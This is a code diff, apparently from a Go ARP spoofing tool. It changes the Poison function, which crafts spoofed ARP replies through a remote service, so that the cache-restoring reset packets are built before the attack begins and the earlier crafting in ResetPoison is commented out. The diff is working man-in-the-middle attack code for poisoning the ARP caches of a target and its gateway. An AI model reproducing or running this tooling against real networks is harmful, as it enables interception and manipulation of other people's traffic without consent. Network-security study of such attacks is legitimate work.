@@ -17,6 +17,11 @@ ARP spoof:
 2: Send ARP packet posing as target IP to gateway (srcMAC=me, srcIP=target, dstMAC=gateway, dstIP=gateway)
 */
 
+// Global reset packets because we want to create them before starting attack,
+// since attacker can lose internet connection while attacking, so creating
+// packets remotely mid-attack is unstable.
+var resetTargetPacket, resetRouterPacket []byte
+
 func Poison(
 	handle *pcap.Handle,
 	jwt string,
@@ -35,6 +40,17 @@ func Poison(
 		return
 	}
 	toTargetPacket, err := remote.CraftPacketRemotely(iface.HardwareAddr, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
+	if err != nil {
+		errors.HandleFatalError(err)
+		return
+	}
+	// Create reset packets for later
+	resetRouterPacket, err = remote.CraftPacketRemotely(gatewayMAC, gatewayIP, targetMAC, targetIP, layers.ARPReply, jwt)
+	if err != nil {
+		errors.HandleFatalError(err)
+		return
+	}
+	resetTargetPacket, err = remote.CraftPacketRemotely(targetMAC, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
 	if err != nil {
 		errors.HandleFatalError(err)
 		return
@@ -62,16 +78,16 @@ func ResetPoison(
 	gatewayIP net.IP,
 	jwt string,
 ) {
-	resetRouterPacket, err := remote.CraftPacketRemotely(gatewayMAC, gatewayIP, targetMAC, targetIP, layers.ARPReply, jwt)
-	if err != nil {
-		errors.HandleFatalError(err)
-		return
-	}
-	resetTargetPacket, err := remote.CraftPacketRemotely(targetMAC, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
-	if err != nil {
-		errors.HandleFatalError(err)
-		return
-	}
+	//resetRouterPacket, err := remote.CraftPacketRemotely(gatewayMAC, gatewayIP, targetMAC, targetIP, layers.ARPReply, jwt)
+	//if err != nil {
+	//	errors.HandleFatalError(err)
+	//	return
+	//}
+	//resetTargetPacket, err := remote.CraftPacketRemotely(targetMAC, targetIP, gatewayMAC, gatewayIP, layers.ARPReply, jwt)
+	//if err != nil {
+	//	errors.HandleFatalError(err)
+	//	return
+	//}
 
 	// Sleep for two seconds so target can digest poison before resetting poison.
 	// Do this three times.
